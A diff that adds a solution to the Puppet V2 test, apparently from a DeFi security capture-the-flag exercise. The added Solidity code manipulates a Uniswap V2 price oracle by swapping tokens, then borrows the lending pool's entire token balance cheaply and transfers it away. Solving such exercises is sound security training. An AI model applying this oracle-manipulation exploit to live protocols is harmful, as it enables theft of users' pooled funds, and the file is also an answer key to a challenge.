@@ -98,7 +98,24 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // By sending our 10,000 DVT to the pair, we can lower dramatically
+        // its price at the exchange, since the original reserve is 100 DVT.
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp * 2);
+
+        // Wrap the ETH into WETH
+        uint256 requiredWETHValue = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: requiredWETHValue}();
+
+        // Borrow the DVT
+        weth.approve(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // Complete the exercise
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
